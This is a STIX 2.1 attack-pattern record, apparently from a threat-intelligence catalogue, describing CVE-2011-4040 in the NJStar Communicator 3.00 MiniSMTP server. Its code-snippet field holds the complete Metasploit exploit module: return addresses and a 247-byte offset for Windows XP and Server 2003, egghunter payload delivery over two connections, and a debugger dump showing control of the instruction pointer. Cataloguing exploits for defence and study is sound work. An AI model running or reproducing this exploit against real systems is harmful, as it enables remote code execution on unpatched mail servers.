{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c9f6794-936d-4776-a6cc-30301033d50b",
    "created": "2024-08-14T16:38:35.90255Z",
    "modified": "2024-08-14T16:38:35.902554Z",
    "name": "NJStar Communicator 3.00 MiniSMTP Buffer Overflow",
    "description": " This module exploits a stack buffer overflow vulnerability in NJStar Communicator Version 3.00 MiniSMTP server.  The MiniSMTP application can be seen in multiple NJStar products, and will continue to run in the background even if the software is already shutdown.  According to the vendor's testimonials NJStar software is also used by well known companies such as Siemens, NEC Google, Yahoo, eBay; government agencies such as the FBI, Department of Justice (HK); as well as a long list of universities such as Yale, Harvard University of Tokyo, etc.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smtp/njstar_smtp_bof.rb",
            "external_id": "njstar_smtp_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4040"
        },
        {
            "source_name": "reference",
            "url": "http://www.njstar.com/cms/njstar-communicator"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NJStar Communicator 3.00 MiniSMTP Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow vulnerability in NJStar Communicator\n        Version 3.00 MiniSMTP server.  The MiniSMTP application can be seen in multiple\n        NJStar products, and will continue to run in the background even if the\n        software is already shutdown.  According to the vendor's testimonials,\n        NJStar software is also used by well known companies such as Siemens, NEC,\n        Google, Yahoo, eBay; government agencies such as the FBI, Department of\n        Justice (HK); as well as a long list of universities such as Yale, Harvard,\n        University of Tokyo, etc.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dillon Beresford', # Original discovery and MSF Module.\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '76728' ],\n          [ 'CVE', '2011-4040' ],\n          [ 'URL', 'http://www.njstar.com/cms/njstar-communicator' ],\n          [ 'EDB', '18057' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -1500,\n        },\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP2/SP3',\n            {\n              'Ret'    => 0x77c35459, # PUSH ESP; RETN (MSVCRT.dll)\n              'Offset' => 247,\n            }\n          ],\n          [\n            # Can't test patch level on this one, because you can't\n            # even update Win2k3 SP0 anymore from Windows Update\n            'Windows Server 2003 SP0',\n            {\n              'Ret'    => 0x77d20738, # JMP ESP (USER32.dll)\n              'Offset' => 247,\n            }\n          ],\n          [\n            'Windows Server 2003 SP1/SP2',\n            {\n              'Ret'    => 0x77BE2265, # PUSH ESP; RETN (MSVCRT.dll)\n              'Offset' => 247,\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-10-31',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(25)])\n  end\n\n  def check\n    connect\n    # We get a response like: \"220 [host-name] Service Ready\"\n    # But we don't really care about this one\n    res = sock.get_once(-1, 5)\n    vprint_status(\"Banner: #{res.to_s.chop}\")\n\n    sock.puts(\"HELP\\r\\n\")\n\n    # But the HELP response will tell us if this is a NJStar SMTP or not\n    res = sock.get_once(-1, 5)\n    vprint_status(\"HELP Response: #{res.to_s.chop}\")\n    disconnect\n\n    # I can only flag it as \"Detected\" because it doesn't return a version\n    if res =~ /Windows E-mail Server From NJStar Software/i\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    eggoptions =\n    {\n      :checksum => true,\n      :eggtag => \"w00t\"\n    }\n\n    hunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)\n\n    buffer = rand_text(target['Offset'])\n    buffer << [target.ret].pack('V')\n    buffer << hunter\n    buffer << make_nops(4)\n\n    # Just some debugging output so we can see lengths and byte size of each of our buffer.\n    vprint_status(\"egg: %u bytes: \\n\" % egg.length + Rex::Text.to_hex_dump(egg))\n    vprint_status(\"hunter: %u bytes: \\n\" % hunter.length + Rex::Text.to_hex_dump(hunter))\n    vprint_status(\"buffer: %u bytes:\\n\" % buffer.length + Rex::Text.to_hex_dump(buffer))\n\n    print_status(\"Trying target #{target.name}...\")\n\n    # har har har you get trick no treat...\n    # we dont have very much space so we\n    # send our egg in a seperate connection\n    connect\n\n    print_status(\"Sending the egg...\")\n    sock.put(egg)\n\n    # I think you betta call, ghostbusters...\n    # now we send our evil buffer along with the\n    # egg hunter, we are doing multiple connections\n    # to solve the issue with limited stack space.\n    # thanks to bannedit for advice on threads and\n    # making multiple connections to get around\n    # stack space constraints. :)\n    connect\n\n    print_status(\"Sending our buffer containing the egg hunter...\")\n    sock.put(buffer)\n\n    handler\n    disconnect\n  end\nend\n\n\n=begin\nDillon Beresford\nhttps://twitter.com/#!/D1N\n\nNJStar Communicator\nVersion: 3.00 and prior\nBuild: 11818 and prior\n\nTested minismtp version:\n1.30.0.60218\n\nShouts to bannedit, sinn3r, rick2600, tmanning, corelanc0d3r, jcran,\nmanils, d0tslash, mublix, halsten, and everyone at AHA!\n\nNo response as of 10/31/11 from AUSCERT or the software vendor. CNCERT and USCERT responded\non 10/30/11 and 10/31/11, CNCERT said in an email they needed to see if the vulnerability\nis remotely exploitable and needed more verification. I sent a proof of concept exploit\nin python with remote code execution. So, here is the proof that the bug is, in fact,\nremotely exploitable. WIN!\n\nSystem DLLs are used for target.ret because minismtp.exe is the only NJStar component in\nmemory, and its base starts with a 0x00, that's no good.  However, if your target machine\nstarted minismtp from the Windows start menu (Start -> All Programs -> NJStar Communicator\n-> NJStar MiniSmtp), it'd actually load up more DLLs. And one of them -- MSVCR100.dll -- is\nideal enough to use (No rebase, starts with a high address, but there is an ASLR flag).\n\neax=00000000 ebx=00417bf8 ecx=00002745 edx=00000000 esi=008a3e50\nedi=008a3d80\neip=42424242 esp=00ccff70 ebp=7c8097d0 iopl=0          nv up ei pl nz na pe nc\ncs=001b\t ss=0023  ds=0023  es=0023\tfs=003b\t gs=0000\nefl=00010206\n42424242 ??     ???\n0:003> !exchain\nimage00400000+bbc4 (0040bbc4)\n00ccff00: 41414141\nInvalid exception stack at 41414141\n0:003> d esp\n00ccff70  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD\n00ccff80  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD\n00ccff90  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD\n00ccffa0  44 44 44 44 00 ff cc 00-c4 bb 40 00 20 23 41 00  DDDD......@. #A.\n00ccffb0  00 00 00 00 ec ff cc 00-29 b7 80 7c b8 3d 8a 00  ........)..|.=..\n00ccffc0  00 00 00 00 00 00 00 00-b8 3d 8a 00 00 c0 fd 7f  .........=......\n00ccffd0  00 d6 e3 89 c0 ff cc 00-98 08 99 89 ff ff ff ff  ................\n00ccffe0  d8 9a 83 7c 30 b7 80 7c-00 00 00 00 00 00 00 00  ...|0..|........\n\n=end\n",
    "x_mitre_disclosure_date": "2011-10-31",
    "x_mitre_platforms": [
        "win'"
    ]
}